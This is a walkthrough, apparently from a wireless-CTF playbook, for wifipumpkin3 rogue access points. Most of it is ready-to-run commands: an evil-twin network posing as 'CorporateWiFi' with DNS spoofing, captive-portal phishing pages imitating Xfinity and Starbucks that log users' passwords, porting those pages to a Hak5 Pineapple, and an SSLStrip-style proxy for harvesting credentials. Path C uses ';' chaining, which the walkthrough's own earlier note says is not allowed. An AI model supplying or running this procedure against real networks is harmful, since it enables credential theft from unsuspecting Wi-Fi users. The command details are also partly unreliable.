# wifipumpkin3 — walkthrough

**Verified against:** wifipumpkin3 1.1.7 as of 2026-Q3

Two paths. Run WP3 standalone against a target from a laptop, or
lift its templates for use in the Pineapple's evil-portal module.

## Path A — Standalone rogue

```
# From a released install (PyPI or the repo's setup.py):
sudo wifipumpkin3

# Inside the WP3 REPL — one command per line (no ';' chaining):
wp3 > set interface wlan1
wp3 > set ssid CorporateWiFi
wp3 > set proxy captiveflask
wp3 > ignore pumpkinproxy
wp3 > set plugin dns_spoof
wp3 > plugins dns_spoof on
wp3 > start
```

Once running, WP3:

- Brings up a hostapd instance on `wlan1`.
- Starts dnsmasq for DHCP.
- Redirects DNS to itself.
- Serves the captive portal from `templates/phishing_ap/<current>/`.
- Logs form POSTs to `logs/wp3-creds.log`.

Switch templates mid-run:

```
wp3 > set captiveflask.template starbucks
wp3 > restart
```

## Path B — Import a WP3 template into evil-portal (Pineapple)

The Pineapple's `evil-portal` module serves templates from
`/root/portals/`. WP3 templates are self-contained enough to drop in
with minor tweaks.

```
# 1. Copy the template from WP3 to a workstation.
scp -r wifipumpkin3/templates/phishing_ap/xfinity ./

# 2. Rewrite the form action to point at evil-portal's logger.
sed -i 's|action=".*"|action="/login"|' xfinity/captive.html

# 3. Upload to the Pineapple's portals dir.
scp -r xfinity root@172.16.42.1:/root/portals/xfinity

# 4. In the Pineapple WebUI: enable evil-portal, select "xfinity".
```

The Pineapple's evil-portal handler already implements DHCP + DNS
+ HTTP redirect + form logging, so WP3's `login.php` becomes
unnecessary.

## Path C — SSLStrip-style downstream injection

```
wp3 > set proxy pumpkinproxy
wp3 > set plugin sniffkin3; on
wp3 > start
```

Associated clients' unencrypted HTTP requests are captured; HSTS-
unprotected forms have creds harvested transparently. Not a WCTF
flag surface *directly* but sometimes the flag rides in an HTTP
request from a scorer bot.

## Failure modes

- **wifipumpkin3 errors on hostapd start.** Adapter isn't in a
  state WP3 accepts. Kill NetworkManager first:
  `sudo systemctl stop NetworkManager`.
- **Template doesn't render.** Missing PHP or the plugin isn't
  captiveflask. Check `wp3 > show plugins`.
- **Template imported to evil-portal renders unstyled.** The
  Pineapple's evil-portal doesn't ship every CSS/JS runtime WP3
  assumes. Copy `assets/` alongside the HTML.

## Cite

- WiFiPumpkin3 GitHub.
- Hak5 evil-portal module documentation.
- attacks.json: `evil-twin-clone`, `captive-portal-cred-capture`.
